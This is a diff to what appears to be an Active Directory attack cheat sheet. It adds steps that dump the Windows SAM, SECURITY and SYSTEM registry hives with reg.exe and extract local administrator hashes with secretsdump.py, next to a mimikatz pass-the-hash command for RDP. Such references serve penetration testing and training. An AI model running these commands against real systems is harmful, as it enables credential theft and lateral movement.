@@ -768,6 +768,16 @@ or with the builtin Windows RDP and mimikatz
 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
 ```
 
+You can extract the local SAM database to find the local administrator hash :
+
+```powershell
+C:\> reg.exe save hklm\sam c:\temp\sam.save
+C:\> reg.exe save hklm\security c:\temp\security.save
+C:\> reg.exe save hklm\system c:\temp\system.save
+$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+
 ### OverPass-the-Hash (pass the key)
 
 Request a TGT with only the NT hash then you can connect to the machine using the TGT.
